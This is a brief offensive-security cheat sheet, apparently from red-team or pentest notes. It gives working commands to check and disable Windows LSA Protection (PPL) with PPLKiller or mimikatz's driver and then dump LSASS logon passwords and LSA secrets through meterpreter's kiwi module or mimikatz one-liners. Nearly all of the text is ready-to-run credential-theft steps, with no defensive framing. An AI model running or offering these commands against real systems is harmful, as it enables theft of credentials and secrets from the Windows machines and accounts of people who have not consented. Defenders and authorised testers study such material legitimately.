### <ins>Check if PPL is enabled</ins>
CMD: `reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL` - `0x1` means enabled.

### <ins>Disable PPL using PPLKiller</ins>

Make sure the session you are running with has SYSTEM privleges.
We need to upload the driver to the path:
- `C:\Windows\System32\config\systemprofile\AppData\Local\Temp` - The Temp directory might no exist, just create it - `mkdir Temp`.

Then we will disable PPL: 
- `.\PPLKiller.exe /disablePPL <LSASS PID>`

Now we can use meterpreter mimikatz module to dump the lsass process: 
- `load kiwi` - `creds_all` - `lsa_dump_secrets`

### <ins>Disable PPL using mimikatz</ins>
Transfer both `mimikatz.exe` and `mimidrv.sys` to the same directory, e.g `C:\Windows\Tasks`.

Dump logonpasswords: 
- `.\mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "sekurlsa::logonpasswords" "exit"`

Dump secrets: 
- `.\mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "lsadump::secrets" "exit"`

Restore: 
- `.\mimikatz.exe "!processprotect /process:lsass.exe" "!-" "exit"`
